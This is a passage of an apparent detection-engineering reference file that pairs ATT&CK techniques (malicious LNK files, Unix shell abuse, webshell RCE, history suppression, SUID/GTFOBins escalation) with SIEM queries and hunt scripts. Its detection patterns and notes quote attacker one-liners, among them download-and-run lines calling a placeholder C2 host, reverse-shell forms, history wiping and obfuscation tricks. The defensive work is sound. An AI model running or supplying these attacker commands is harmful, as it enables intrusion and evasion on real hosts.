    '(cmd|powershell|wscript|cscript|mshta|rundll32)\.exe$' -and
  $_.Properties[10].Value -match
    '(ExecutionPolicy.*Bypass|EncodedCommand|WindowStyle.*Hidden|vbscript:|javascript:|http://|https://|AppData|Temp|ProgramData)'
} | Select TimeCreated,
  @{n='Image';e={($_.Properties[4].Value -split '\\\\')[-1]}},
  @{n='CmdLine';e={$_.Properties[10].Value}},
  @{n='User';e={$_.Properties[12].Value}} |
  Sort-Object TimeCreated -Descending

# Parse LNK files in user paths (analyze-on-disk approach)
# Useful for live host triage of recent phishing artifacts
Get-ChildItem -Path \$env:USERPROFILE -Recurse -Filter *.lnk \`
  -ErrorAction SilentlyContinue |
  ForEach-Object {
    $shell = New-Object -ComObject WScript.Shell
    $lnk = $shell.CreateShortcut($_.FullName)
    if ($lnk.TargetPath -match
      '(cmd|powershell|wscript|cscript|mshta|rundll32)' -or
      $lnk.Arguments -match
        '(ExecutionPolicy|EncodedCommand|vbscript:|javascript:|http)') {
      [PSCustomObject]@{
        LnkFile     = $_.FullName
        TargetPath  = $lnk.TargetPath
        Arguments   = $lnk.Arguments
        WorkingDir  = $lnk.WorkingDirectory
        Description = $lnk.Description
        IconPath    = $lnk.IconLocation
      }
    }
  }`,
        registry: `LNK file structure (binary format):
- Inspect with LECmd (Eric Zimmerman tool) or
  PowerShell WScript.Shell COM object
- Key fields:
  - TargetPath: the actual binary launched
  - Arguments: command-line arguments passed
  - WorkingDirectory: where the target runs from
  - IconLocation: often spoofed (document icon
    on a cmd-launching LNK)
  - Description: tooltip text (often blank for
    adversary LNKs, or contains lure text)

Recent files cache:
- %APPDATA%\\Roaming\\Microsoft\\Windows\\Recent\\
- Windows creates LNK files here automatically
  when documents are opened - useful for showing
  what user actually opened during incident

LNK forensic timestamps:
- LNK files contain three sets of timestamps:
  - LNK file's own MACB timestamps (filesystem)
  - Target file's MACB timestamps (embedded in LNK)
  - Last accessed time (when user opened the LNK)
- These can reveal staging timelines

Zone.Identifier on LNK:
- LNKs delivered via email/web have MOTW
- LNKs inside ISO containers do NOT have MOTW
  (key reason ISO+LNK is the modern delivery chain)`,
        tools: `LNK abuse patterns:
- Document-icon LNK pointing to powershell.exe with
  -EncodedCommand argument
- LNK pointing to cmd.exe /c with chained payload
- LNK with WorkingDirectory in suspicious path
- LNK with Arguments containing URL (fetch + execute)
- LNK with very long argument string truncated in
  Explorer's tooltip (intentional UI evasion)

LNK generation:
- mklink (built-in Windows command)
- New-Object -ComObject WScript.Shell + CreateShortcut
  (PowerShell - heavily used by adversaries)
- Custom LNK generators (LNKUp, etc.)
- Cobalt Strike artifact kit includes LNK generation

LNK forensic tools:
- LECmd (Eric Zimmerman): LNK file analyzer
- Windows-LnkFile-DB: parsed LNK reference data
- KAPE: includes LNK collection targets

Delivery context:
- Inside ZIP attachments (most common phishing path)
- Inside ISO/IMG containers (post-MOTW evasion)
- Inside OneNote .one files
- Standalone .lnk in email (rarer - many mail
  gateways block .lnk attachments)`,
        ossdetect: `Sigma:
- proc_creation_win_lnk_susp_target.yml
- proc_creation_win_susp_explorer_child.yml
- file_event_win_lnk_creation_susp_location.yml

Atomic Red Team:
- T1204.002 (user execution tests)
- T1547.009 (Shortcut Modification - LNK persistence)

Hayabusa:
- SuspExplorerChildWithRiskyArgs rules
- LnkLaunchingInterpreter detection

Velociraptor:
- Windows.Forensics.Lnk (LNK file parser)
- Windows.EventLogs.Sysmon
- Windows.System.RecentFileCache

LECmd by Eric Zimmerman:
- Standalone LNK file analyzer
- Parses all LNK fields including hidden ones
- Free tool, essential for LNK forensic work`,
        notes: "LNK files are the connective tissue of modern phishing delivery chains - particularly in ISO containers where the LNK provides the user-clickable interface while the actual payload (often a script or DLL) sits hidden in the same container. The detection focuses on the execution artifact rather than the LNK file itself: when a user double-clicks a malicious LNK, Sysmon EID 1 captures the resulting process spawn with explorer.exe as the parent and the LNK's target+arguments visible in the new process's command line. This is why the explorer.exe parent context combined with risky command-line arguments (ExecutionPolicy Bypass, EncodedCommand, vbscript:, URL fetches, suspicious paths) is so high-fidelity. The live-host LNK enumeration PowerShell script is useful for IR triage: it parses every LNK in the user profile and flags ones with suspicious targets/arguments. False positives: some legitimate software ships .lnk files in user paths (Quick Launch, custom shortcuts created by installers), and developer workflows sometimes involve LNK files with command-line arguments - context matters. The strongest single signal is a LNK file in Downloads, Desktop, or a temp ZIP extraction directory with a TargetPath of cmd/powershell/wscript and an Arguments field containing payload-like content.",
        apt: [
          { cls: "apt-mul", name: "QakBot", note: "ISO + LNK + payload chains are signature QakBot delivery pattern post-2022." },
          { cls: "apt-mul", name: "Bumblebee", note: "LNK-based execution from ISO containers documented across loader campaigns." },
          { cls: "apt-cn", name: "Mustang Panda", note: "LNK-based phishing documented in operations targeting Southeast Asian governments." },
          { cls: "apt-kp", name: "Lazarus", note: "LNK-based delivery documented in financial sector targeting operations." },
          { cls: "apt-mul", name: "Commodity Phishing", note: "LNK is the most common single file type in post-MOTW commodity phishing delivery." }
        ],
        cite: "MITRE ATT&CK T1204.002, T1566.001"
      }
    ]
  },
  {
    id: "T1059.004",
    name: "Command and Scripting Interpreter: Unix Shell",
    desc: "Adversaries abuse bash, sh, dash, or zsh to execute commands, scripts, and pipelines - the primary interactive and scripted execution surface on Linux.",
    rows: [
      {
        sub: "T1059.004 - Suspicious Shell Execution (curl|bash, base64, reverse shells)",
        os: "linux",
        indicator: "A shell (bash/sh/dash) spawned with piped-download execution, base64-decoded payloads, or reverse-shell one-liners - especially from a network-facing service parent",
        sysmon: `// Sysmon for Linux ProcessCreate (EID 1)
EventID=1
Image=*/bash OR */sh OR */dash OR */zsh
CommandLine matches (any of):
  *curl* *| *bash*  OR  *wget* *| *sh*       (curl|bash)
  *base64* *-d*  OR  *base64* *--decode*      (decode+run)
  *bash -i* OR */dev/tcp/*  OR  *nc * *-e *    (reverse shell)
  *python* *-c* *socket*                       (py revshell)
  *eval* OR *exec(*

// Network-facing parent is the escalator of suspicion:
ParentImage=*/nginx OR */httpd OR */apache2
  OR */java OR */node OR */php-fpm OR */sshd`,
        kibana: `// Shell with download-pipe-execute or decode-execute
process.name: ("bash" OR "sh" OR "dash" OR "zsh")
AND process.command_line: (*curl* OR *wget* OR *base64* OR *"/dev/tcp/"* OR *"bash -i"* OR *"nc -e"* OR *"socket"*)

// Shell spawned by a network-facing service (webshell / RCE)
process.name: ("bash" OR "sh" OR "dash")
AND process.parent.name: ("nginx" OR "httpd" OR "apache2" OR "java" OR "node" OR "php-fpm" OR "tomcat" OR "sshd")
AND NOT process.command_line: (*"/usr/lib"* OR *logrotate* OR *"apt"*)

// auditd execve of a shell with suspicious args (if shipping auditd)
auditd.data.syscall: "execve"
AND process.title: (*curl*bash* OR *base64*-d* OR *"/dev/tcp/"*)`,
        powershell: `# (Auditd / Shell hunt - this is a Linux row)

# auditd: log all execve (baseline rule), then hunt shells
# /etc/audit/rules.d/execve.rules:
#   -a always,exit -F arch=b64 -S execve -k exec
#   -a always,exit -F arch=b32 -S execve -k exec
ausearch -k exec -i | grep -E 'bash|/bin/sh|dash' |
  grep -E 'curl|wget|base64|/dev/tcp/|nc .*-e|bash -i'

# Live: shells whose parent is a web/app service (RCE/webshell)
ps -eo pid,ppid,user,comm,args --sort=start_time |
  awk '$4 ~ /bash|sh|dash/ {print}' |
  grep -E 'nginx|httpd|apache|java|node|php'

# Shell history sweep for download-pipe-exec patterns
for h in /home/*/.bash_history /root/.bash_history; do
  grep -HnE 'curl.*\\| *bash|wget.*\\| *sh|base64 *-d|/dev/tcp/' "$h" 2>/dev/null
done

# Sysmon for Linux (if deployed) - same EID 1 model as Windows
grep -a 'curl\\|base64\\|/dev/tcp/' /var/log/syslog 2>/dev/null  # adjust to your Sysmon sink`,
        registry: `(File Artifacts - Linux row)

No registry on Linux. Relevant execution artifacts:

Shell history files (primary forensic source):
  ~/.bash_history , ~/.zsh_history , ~/.sh_history
  /root/.bash_history
  - Note: attackers often unset HISTFILE, set
    HISTSIZE=0, or 'rm' history - absence/truncation is
    itself a signal. Check HISTCONTROL / HISTFILE in
    ~/.bashrc, ~/.profile for tampering.

Dropped payloads (common locations):
  /tmp, /var/tmp, /dev/shm  (world-writable, memory-backed)
  ~/.cache, ~/.config  (blend-in user dirs)
  /tmp/.<hidden>  (dot-prefixed to hide from ls)

Execution evidence:
  /proc/<pid>/cmdline , /proc/<pid>/exe (symlink to binary,
    or '(deleted)' if the binary was unlinked while running
    - a strong fileless-execution tell)
  /proc/<pid>/environ , /proc/<pid>/cwd

Investigation pivots:
- A process whose /proc/<pid>/exe points to a deleted file
  is running fileless - high suspicion
- Payloads in /dev/shm or /tmp/.hidden with execute bit
- History tampering (HISTFILE unset) on a user that
  shouldn't be doing admin work`,
        tools: `Metasploit / Meterpreter (Linux payloads)
Sliver / Havoc / Mythic (Linux implants)
msfvenom-generated bash/python reverse shells
pupy, Merlin, other cross-platform C2
GTFOBins - the reference for living-off-the-land Unix
  binaries (shell escapes, download+exec via legit tools)
Manual operators - curl|bash and /dev/tcp reverse shells
  are the most common hands-on-keyboard Linux execution
Web-exploitation frameworks dropping shell payloads`,
        ossdetect: `Sigma (Linux rules):
- lnx_shell_susp_curl_pipe_bash.yml
- lnx_shell_susp_rev_shell_pattern.yml
- lnx_shell_susp_base64_decode_exec.yml
- lnx_auditd_susp_shell_from_web_service.yml

Atomic Red Team:
- T1059.004 (Unix shell execution tests)

Auditd:
- execve logging (-S execve -k exec) is the foundation
- aushape / go-audit for shipping to a SIEM

Sysmon for Linux:
- ProcessCreate (EID 1) rules mirroring the Windows set

Other:
- Falco (syscall-level: "Shell in container", "Run shell
  untrusted") - strong for containerized Linux workloads
- auditbeat / Elastic Defend on Linux endpoints`,
        notes: "Unix shell is the Linux analogue of the PowerShell/cmd execution rows on the Windows side, and the highest-volume execution surface on Linux. The single most valuable pattern to hunt is a shell spawned by a network-facing service (nginx, apache, php-fpm, tomcat, java, node) - that lineage almost always means a webshell or exploited RCE, exactly mirroring the Windows 'Office spawns powershell' logic. After that, the content patterns: curl|bash and wget|sh (download-pipe-execute), base64 -d piped to a shell (obfuscated payloads), and reverse-shell one-liners (bash -i >& /dev/tcp/.../..., nc -e, python -c socket). Telemetry: auditd execve logging is the foundation and should be enabled with a catch-all execve rule keyed for easy searching; Sysmon for Linux gives you the same EID 1 ProcessCreate model you already use on Windows, so the detection logic ports cleanly. Don't rely on shell history as a primary control - attackers routinely unset HISTFILE or truncate it, so treat history tampering itself as a signal. A process whose /proc/<pid>/exe link shows '(deleted)' is running a binary that was unlinked while executing - a strong fileless tell worth a dedicated check. For containerized Linux, Falco is the strongest runtime detector. Baseline legitimate automation (config-management agents, cron-driven maintenance scripts, package managers running shells) to keep curl|bash and service-spawned-shell rules from drowning in deployment noise.",
        apt: [
          { cls: "apt-cn", name: "APT41", note: "Linux shell payloads and reverse shells used extensively against Linux servers and appliances." },
          { cls: "apt-ru", name: "APT28", note: "Unix shell execution incl. reverse shells documented against Linux infrastructure targets." },
          { cls: "apt-kp", name: "Lazarus", note: "Linux shell-based loaders and reverse shells in financial/supply-chain intrusions." },
          { cls: "apt-mul", name: "Cryptojacking / TeamTNT", note: "curl|bash droppers are the near-universal delivery for Linux coinminers and worms." },
        ],
        cite: "MITRE ATT&CK T1059.004",
      },
      {
        sub: "T1059.004 - Web Server Process Spawning Interactive Shell (RCE Indicator)",
        os: "linux",
        indicator: "bash/sh/dash spawned where parent process is a web or application server (httpd, nginx, php-fpm, java/Tomcat, gunicorn, uwsgi) — near-certain web exploitation RCE; shell child of any web worker has near-zero legitimate justification",
        sysmon: `// Sysmon for Linux EID 1 (ProcessCreate)
// Parent = web process, Child = shell

EventID=1
ParentImage matches (any of):
  */httpd  */apache2  */apache  */lighttpd
  */nginx  */php  */php-fpm  */php7*  */php8*
  */python*  */gunicorn  */uwsgi
  */java  */catalina  */node  */ruby  */perl
AND Image matches:
  */bash  */sh  */dash  */zsh  */csh

// auditd rule (supplemental):
// -a always,exit -F arch=b64 -S execve -k exec
// Then in SIEM: correlate execve where auid maps to
// a process tree rooted at a web worker PID

// High-signal variant: shell spawning a downloader
// (httpd → bash → curl/wget = confirmed stage-2 pull)
ParentImage matches (*httpd* OR *nginx* OR *php* OR *java*)
AND Image matches (*bash* OR */sh OR */dash*)
AND CommandLine matches (*curl* OR *wget* OR *python* OR /tmp/* OR /dev/shm/*)`,
        kibana: `// High-confidence: web process parent, shell child
process.name: ("bash" OR "sh" OR "dash" OR "zsh")
AND process.parent.name: (
  "httpd" OR "apache2" OR "nginx" OR "lighttpd"
  OR "php" OR "php-fpm" OR "php7.4-fpm" OR "php8.1-fpm" OR "php8.2-fpm"
  OR "python" OR "python3" OR "ruby" OR "perl"
  OR "java" OR "node" OR "gunicorn" OR "uwsgi"
)

// Sysmon for Linux EID 1
event.code: "1"
AND process.executable: (*bash OR *sh OR *dash OR *zsh)
AND process.parent.executable: (
  *httpd* OR *apache* OR *nginx* OR *php*
  OR *java* OR *python* OR *ruby* OR *perl* OR *node*
  OR *gunicorn* OR *uwsgi*
)

// Shell spawned by web process then runs downloader
process.name: ("bash" OR "sh" OR "dash")
AND process.parent.name: (*httpd* OR *nginx* OR *php* OR *java* OR *python*)
AND process.command_line: (*curl* OR *wget* OR */tmp/* OR */dev/shm/*)

// Falco-style: spawned_process AND parent in web_server_binaries
// (Falco built-in rule covers this natively)`,
        powershell: `#!/bin/bash
# T1059.004 - Web process spawning shell hunt

echo "[*] === Sysmon for Linux: web-spawned shell events ==="
if [ -f /var/log/syslog ]; then
  grep -E "ParentImage.*/(httpd|apache|nginx|php|java|python|ruby|perl|node|gunicorn|uwsgi)" \\
    /var/log/syslog 2>/dev/null | grep -E "Image.*/(bash|sh|dash|zsh)" | tail -50
fi

echo ""
echo "[*] === auditd: execve where parent was a web process ==="
ausearch -k exec -i 2>/dev/null | \\
  awk '/^----/{block=""} {block=block $0 "\\n"}
       /exe=.*\\/(bash|sh|dash|zsh)/{
         if (block ~ /(httpd|apache|nginx|php|java|python3?|ruby|perl|node|gunicorn|uwsgi)/)
           print block}' | head -100

echo ""
echo "[*] === Live: shells whose parent is a web process ==="
for pid in $(pgrep -x bash) $(pgrep -x sh) $(pgrep -x dash); do
  ppid=$(awk '/PPid/{print $2}' /proc/$pid/status 2>/dev/null)
  parent=$(cat /proc/$ppid/comm 2>/dev/null)
  if echo "$parent" | grep -qiE "httpd|apache|nginx|php|java|python|ruby|perl|node|gunicorn|uwsgi"; then
    echo "[ALERT] Shell PID $pid parent=$parent (PPID $ppid)"
    tr '\\0' ' ' < /proc/$pid/cmdline 2>/dev/null; echo
  fi
done

echo ""
echo "[*] === Web access logs: POST to small/unusual PHP/JSP ==="
for log in /var/log/apache2/access.log /var/log/nginx/access.log /var/log/httpd/access_log; do
  [ -f "$log" ] || continue
  echo "--- $log (recent POSTs to .php/.jsp) ---"
  grep "POST" "$log" 2>/dev/null | grep -E "\\.(php|jsp|cgi|pl|py)" | tail -20
done`,
        registry: `No registry on Linux. RCE execution artifacts:

Web log files (correlate with process tree):
  /var/log/apache2/access.log    - POST to vulnerable endpoint
  /var/log/apache2/error.log     - PHP/CGI errors pre-exec
  /var/log/nginx/access.log
  /var/log/nginx/error.log
  /var/log/httpd/access_log      - RHEL path

Webshell file artifacts:
  /var/www/html/**/*.php         - PHP webshell (small file, mtime anomaly)
  /var/www/html/**/*.jsp         - JSP webshell (Tomcat targets)
  /tmp/*.php , /dev/shm/*.php
  /var/www/uploads/**/*          - uploaded payloads

CGI directories:
  /usr/lib/cgi-bin/              - malicious CGI scripts
  /var/www/cgi-bin/

Process ancestry (definitive):
  web process should NEVER have shell children
  /proc/<pid>/status → PPid chain traces the parent
  httpd → bash = webshell or direct exploit

PHP functions that indicate webshell:
  eval(), system(), exec(), passthru(), shell_exec()
  proc_open(), popen(), pcntl_exec()
  (grep -r these in webroot for webshell hunt)`,
        tools: `Web process → shell is the post-exploitation entry for:

APT41 (CN) - exploits internet-facing apps (Confluence,
  Log4j, Citrix, F5) for initial access; java → bash
  or php-fpm → dash is the exact process tree pattern

UNC3524 / Salt Typhoon / Volt Typhoon (CN) - exploitation
  of internet-facing management interfaces; web process
  shell spawn in CISA advisories 2024-2025

MuddyWater / APT34 (IR) - PHP webshells for initial access
  on Linux web servers; CGI-spawned shell is signature

Log4Shell (CVE-2021-44228) operators: java → sh → curl
  is the canonical artifact; massive volume 2021-2023

ProxyShell, Spring4Shell, Confluence CVEs:
  Application server → shell → download payload

Webshell families on Linux:
  WSO, b374k, China Chopper, Godzilla
  (all generate web-process-spawned shell tree)

Falco built-in rule covers this exactly:
  "Spawning Shell in a Container" and
  "Run shell untrusted" detect web → shell patterns
  requiring zero custom rule development`,
        ossdetect: `Sigma rules:
- proc_creation_lnx_webserver_spawning_shell.yml
- proc_creation_lnx_java_shell_spawn.yml (Log4j)
- proc_creation_lnx_susp_shell_parent.yml

Elastic detection rules:
- Web Shell Detected on Linux Server
- Linux Web Server Spawning Shell
- Shell Spawned by Web Server Process

Falco (built-in, high-confidence):
  rule: Spawning Shell in a Container
  rule: Run shell untrusted
  condition: spawned_process and shell_procs
    and proc.pname in (web_server_binaries)

Wazuh:
  Built-in rule 31101 (web attack detected)
  Custom rule: spawned_process where parent
  in apache_binaries triggers alert

Atomic Red Team:
  T1190 tests simulate webshell drop and execution
  (exploit public-facing application → shell)

GRR / Velociraptor:
  Linux.Detection.WebShell
  Hunt for small .php files with shell functions
  in webroot directories`,
        notes: "Web server process spawning a shell is the single highest-confidence RCE indicator on Linux servers. nginx, Apache, PHP-FPM, and Java application servers have no legitimate reason to spawn an interactive shell. When you see httpd → bash or php-fpm → sh → wget in your process tree, you are looking at webshell execution or direct web vulnerability exploitation. The detection is straightforward to implement and extremely low false-positive: the parent process set (web workers) is small and well-defined, and any shell child is anomalous. Correlate with web access logs to identify the exploited endpoint: look for POST requests to small PHP files or unusual URL patterns in the seconds before the shell spawn. The CGI pattern (httpd directly spawning a shell) is less common on modern stacks but still appears on legacy systems. The modern pattern is php-fpm → dash → curl/wget/python, or java (Tomcat/Spring/Log4j) → sh → payload. Falco provides this detection as a built-in rule with near-zero tuning required. Deploy it or the equivalent Sigma/Elastic rule as a high-severity alert on any Linux server hosting web applications.",
        apt: [
          { cls: "apt-cn", name: "APT41", note: "Exploits internet-facing applications (Log4j, Confluence, Citrix, F5) for initial access; web process → bash shell tree is the signature artifact." },
          { cls: "apt-cn", name: "Salt/Volt Typhoon", note: "CISA-documented exploitation of internet-facing appliances; web process shell spawn observed in multiple advisories 2024-2025." },
          { cls: "apt-ir", name: "MuddyWater / APT34", note: "PHP webshells used extensively for Linux server initial access; CGI/PHP-FPM parent → shell is characteristic." },
          { cls: "apt-ru", name: "APT28", note: "Web server exploitation against Linux infrastructure; web-spawned shell process tree documented." },
          { cls: "apt-mul", name: "Log4Shell / mass exploiters", note: "CVE-2021-44228 generated enormous volumes of java → sh → curl; many APT and criminal groups exploited this pattern." }
        ],
        cite: "MITRE ATT&CK T1059.004"
      },
      {
        sub: "T1059.004 - Shell History Suppression and Command Obfuscation",
        os: "linux",
        indicator: "HISTFILE redirected to /dev/null, HISTSIZE=0, or 'unset HISTFILE' as first post-access commands; shell obfuscation via ${IFS} word-split bypass, $'\\x..' hex literals, or eval-encoded payloads to evade string-match detection",
        sysmon: `// Sysmon for Linux EID 1 - history suppression commands
// and obfuscation patterns in shell command lines

// HISTFILE suppression (catch via auditd execve)
CommandLine matches (any of):
  *HISTFILE=/dev/null*
  *HISTSIZE=0*  OR  *HISTFILESIZE=0*
  *unset HISTFILE*  OR  *unset HISTSIZE*
  *history -c*  OR  *history -w /dev/null*

// Shell obfuscation - IFS word-split bypass
// Attacker writes: curl\${IFS}http://C2/p|bash
// instead of: curl http://C2/p|bash
CommandLine matches: *\${IFS}* OR *$IFS*

// Hex-encoded command string in bash
CommandLine matches: *$'\\\\x* OR *printf '\\\\x* OR *echo -e '\\\\x*

// Eval with encoding function (base64, rev, xxd)
CommandLine matches:
  *eval* AND (*base64* OR *rev * OR *xxd*)

// PROMPT_COMMAND set to clear history before each prompt
CommandLine matches: *PROMPT_COMMAND*history*`,
        kibana: `// HISTFILE suppression - high-confidence IOC
process.command_line: (
  *HISTFILE=/dev/null* OR *HISTSIZE=0* OR *HISTFILESIZE=0*
  OR *"unset HISTFILE"* OR *"unset HISTSIZE"*
  OR *"history -c"* OR *"history -w /dev/null"*
)

// \${IFS} substitution in shell commands
process.name: ("bash" OR "sh" OR "dash")
AND process.command_line: (*\${IFS}* OR *$IFS*)

// Hex-encoded command literal
process.command_line: (*$'\\x* OR *printf '\\x* OR *echo -e '\\x*)

// eval with encoding
process.name: ("bash" OR "sh" OR "dash")
AND process.command_line: (*eval* AND (*base64* OR *rev *))

// Sysmon EID 1 - any of the above
event.code: "1"
AND process.command_line: (
  *HISTFILE=/dev/null* OR *\${IFS}* OR *$'\\x* OR *"history -c"*
)

// Auditd: check environment of running shells for HISTFILE
// /proc/<pid>/environ shows live HISTFILE value`,
        powershell: `#!/bin/bash
# T1059.004 - History suppression and obfuscation hunt

echo "[*] === HISTFILE suppression in existing shell history ==="
for hf in /root/.bash_history /home/*/.bash_history; do
  [ -f "$hf" ] || continue
  echo "--- $hf ---"
  grep -n -E "(HISTFILE|HISTSIZE|HISTFILESIZE|unset HIST|history -c)" "$hf" 2>/dev/null
done

echo ""
echo "[*] === Empty or missing history files on active accounts ==="
getent passwd | awk -F: '$3 >= 1000 && $7 !~ /nologin|false/ {print $1,$6}' | \\
  while read user home; do
    hf="$home/.bash_history"
    if [ -f "$hf" ]; then
      lines=$(wc -l < "$hf")
      [ "$lines" -eq 0 ] && \\
        echo "[FLAG] Empty history: $hf (mtime: $(stat -c '%y' "$hf"))"
    fi
  done

echo ""
echo "[*] === Live HISTFILE values in running shells ==="
for pid in $(pgrep -x bash) $(pgrep -x sh) $(pgrep -x dash); do
  hf=$(tr '\\0' '\\n' < /proc/$pid/environ 2>/dev/null | grep "^HISTFILE=")
  hs=$(tr '\\0' '\\n' < /proc/$pid/environ 2>/dev/null | grep "^HISTSIZE=\\|^HISTFILESIZE=")
  if echo "$hf" | grep -qE "(dev/null|/tmp|/dev/shm)"; then
    echo "[FLAG] PID $pid: $hf"
  fi
  if echo "$hs" | grep -qE "=0$"; then
    echo "[FLAG] PID $pid history size zeroed: $hs"
  fi
done

echo ""
echo "[*] === auditd: HISTFILE manipulation events (today) ==="
ausearch -k exec -i --start today 2>/dev/null | \\
  grep -E "(HISTFILE|HISTSIZE|history -c)" | tail -30

echo ""
echo "[*] === Obfuscated commands in bash history ==="
for hf in /root/.bash_history /home/*/.bash_history; do
  [ -f "$hf" ] || continue
  echo "--- $hf ---"
  grep -nE '(\\$\\{IFS\\}|\\$IFS|\\$'"'"'\\\\\\\\x|eval.*base64|printf.*\\\\x)' "$hf" 2>/dev/null
done`,
        registry: `Shell history file locations:
  ~/.bash_history        - default (controlled by HISTFILE)
  ~/.zsh_history         - zsh
  ~/.sh_history          - POSIX sh
  /root/.bash_history    - root's history

History suppression indicators:
  Empty HISTFILE (0 bytes)
  HISTFILE symlinked to /dev/null
  HISTFILE pointing to /tmp/*, /dev/shm/*
  HISTSIZE=0 or HISTFILESIZE=0 in shell env
  .bash_logout containing: history -c; rm -f ~/.bash_history
  PROMPT_COMMAND='history -c' (wipes before every prompt)

Live environment check:
  /proc/<pid>/environ    - shows HISTFILE/HISTSIZE for running shell
  (survives even after shell clears history interactively)

Obfuscation encoding patterns to grep:
  \${IFS}                 - replaces space to evade keyword split
  $'\\x41\\x42'          - hex literal encoding in bash
  {c,u,r,l}             - brace expansion to spell commands
  $(echo Y3Vybg==|base64 -d)  - inline decode
  eval "$(...)"          - delayed execution via subshell

Shell config obfuscation vectors:
  alias ls='ls; curl C2/ph | bash'  - command hijack via alias
  function cd() { builtin cd "$@"; malware; }  - function override`,
        tools: `History suppression is near-universal attacker behavior
on interactive Linux shells across all threat categories.

Standard first-session commands observed across APTs:
  export HISTFILE=/dev/null
  unset HISTFILE
  set +o history

Post-ex framework behavior:
  Metasploit python/shell stages: frequently unset HISTFILE
  Empire Linux agents: cleanup routines wipe history
  Manual operators: history suppression is documented
    in operator TTPs for Lazarus, APT41, Equation Group

\${IFS} obfuscation context:
  Evades simple grep/string-match detection rules that
  look for "curl http" but not "curl\${IFS}http"
  Common in automated worm/dropper scripts targeting
  minimal detection environments

$'\\x..' encoding context:
  Encodes banned words (bash, curl, wget) as hex literals
  Bash interprets $'\\x62\\x61\\x73\\x68' as "bash"
  Evades SIEM rules checking for literal keyword strings

PROMPT_COMMAND abuse:
  Bash executes PROMPT_COMMAND before every prompt display
  export PROMPT_COMMAND='history -c'
  Wipes history in real-time; no post-session artifact remains`,
        ossdetect: `Sigma rules:
- proc_creation_lnx_shell_history_wipe.yml
- proc_creation_lnx_histfile_redirection.yml
- proc_creation_lnx_shell_obfuscation_ifsvar.yml
- proc_creation_lnx_eval_encoded_payload.yml

Elastic detection rules:
- Shell History File Deletion or Modification
- Bash History Cleared or Unset
- Potential Shell Obfuscation via IFS

Auditd configuration (catch all execve arguments):
  -a always,exit -F arch=b64 -S execve -k exec
  -w /root/.bash_history -p rwa -k hist_write
  (broad; SIEM-side filter on HISTFILE keyword in args)

auditd + ausearch:
  ausearch -k exec -i | grep -E 'HISTFILE|HISTSIZE|history -c'

Wazuh:
  Syscheck on ~/.bash_history files
  Built-in rules for history file modification

Atomic Red Team:
  T1562.003 (Impair Defenses: HISTFILE clear)
  Also relevant: T1059.004 shell obfuscation tests

Shell audit note:
  Even with HISTFILE=/dev/null, auditd execve log
  captures every command if -S execve is active.
  Auditd is the counter-move to history suppression.`,
        notes: "HISTFILE and shell history suppression is the single most consistent attacker behavior on interactive Linux shells - it is near-universal because it costs nothing and eliminates a primary forensic artifact. The important detection insight: a missing or empty ~/.bash_history on a long-running server with active admin users is immediately suspicious. The /proc/<pid>/environ counter-move is powerful: even if an attacker unsets HISTFILE interactively, the live environment of their shell process retains HISTFILE=/dev/null or HISTSIZE=0, visible via /proc. This doesn't survive process death, making it a live-host-only signal. For obfuscation, ${IFS} substitution is the most common evasion because it requires no encoding - it replaces the space character used to separate flagged keywords, evading simple string-match detection. The correct defense is full auditd execve capture: the audit log records all command arguments before the shell processes them, so even obfuscated commands appear partially decoded in the log. Pair HISTFILE monitoring with auditd execve to close both the evidence-destruction and evasion gaps.",
        apt: [
          { cls: "apt-cn", name: "APT41", note: "History suppression documented as standard operational security across Linux intrusions; ${IFS} and eval obfuscation used in dropper scripts." },
          { cls: "apt-kp", name: "Lazarus", note: "HISTFILE manipulation and shell cleanup documented in post-exploitation stages of Linux financial sector intrusions." },
          { cls: "apt-ru", name: "APT28 / Equation Group", note: "Advanced obfuscation and anti-forensics including history manipulation documented across campaigns." },
          { cls: "apt-mul", name: "All interactive operators", note: "Unsetting HISTFILE is near-universal first-move tradecraft on any interactive Linux shell; applies across commodity and nation-state actors." }
        ],
        cite: "MITRE ATT&CK T1059.004"
      },
      {
        sub: "T1059.004 - SUID Interpreter and GTFOBins Sudo-less Execution",
        os: "linux",
        indicator: "Execution via SUID-bit interpreter (bash -p, python3 -p, perl with SUID) or GTFOBins-listed binary (find -exec, awk system(), vim :!/bin/sh) to gain elevated shell without sudo; or Linux capability abuse (cap_setuid on python3) for password-free privilege",
        sysmon: `// Sysmon for Linux EID 1 - SUID and GTFOBins execution

// bash -p (preserve effective UID when SUID set)
CommandLine matches: *bash -p* OR *bash --privileged*

// python/python3 with -p flag (preserve SUID priv)
Image=*/python* AND CommandLine matches: *-p *

// perl one-liner from SUID context
Image=*/perl AND CommandLine matches: *exec*/bin/sh*

// GTFOBins: find with -exec shell
Image=*/find AND CommandLine matches:
  *-exec */bin/sh* OR *-exec bash* OR *-exec dash*

// GTFOBins: awk system() call
Image=*/awk AND CommandLine matches:
  *system(* OR *BEGIN{system*

// GTFOBins: vim/vi launching shell
Image=(*vim OR *vi) AND CommandLine matches:
  *!/bin/sh* OR *!/bin/bash* OR *-c :!/bin/sh*

// GTFOBins: env executing shell directly
Image=*/env AND CommandLine matches:
  *env /bin/sh* OR *env /bin/bash* OR *env bash*

// sudo -l enumeration (recon before GTFOBins abuse)
Image=*/sudo AND CommandLine matches: *-l*`,
        kibana: `// SUID bash / python execution (preserving effective UID)
process.command_line: ("bash -p" OR "bash --privileged")

process.name: ("python" OR "python3")
AND process.command_line: *-p *

// GTFOBins execution patterns
process.name: "find"
AND process.command_line: (*-exec* AND (*bash* OR */bin/sh* OR *dash*))

process.name: "awk"
AND process.command_line: (*system(* OR *BEGIN{*)
AND process.command_line: (*bash* OR */bin/sh* OR *sh"*)

process.name: ("vim" OR "vi")
AND process.command_line: (*!/bin/sh* OR *!/bin/bash* OR *shell*)

process.name: "env"
AND process.command_line: (*env /bin/sh* OR *env /bin/bash* OR *env bash*)

// sudo -l recon (frequently precedes GTFOBins abuse)
process.name: "sudo"
AND process.command_line: *-l*

// auditd: SUID execution (auid != uid where uid=0)
event.module: "auditd"
AND auditd.data.syscall: "execve"
AND auditd.data.uid: "0"
AND NOT auditd.data.auid: "0"
AND NOT auditd.data.auid: "4294967295"  // unset auid`,
        powershell: `#!/bin/bash
# T1059.004 - SUID/capabilities/GTFOBins hunt

echo "[*] === All SUID binaries ==="
find / -perm -4000 -type f 2>/dev/null | sort | \\
  while read f; do
    echo "$f | owner: $(stat -c '%U' "$f") | perms: $(stat -c '%a' "$f")"
  done

echo ""
echo "[*] === SUID binaries NOT from package manager ==="
find / -perm -4000 -type f 2>/dev/null | sort | \\
  while read f; do
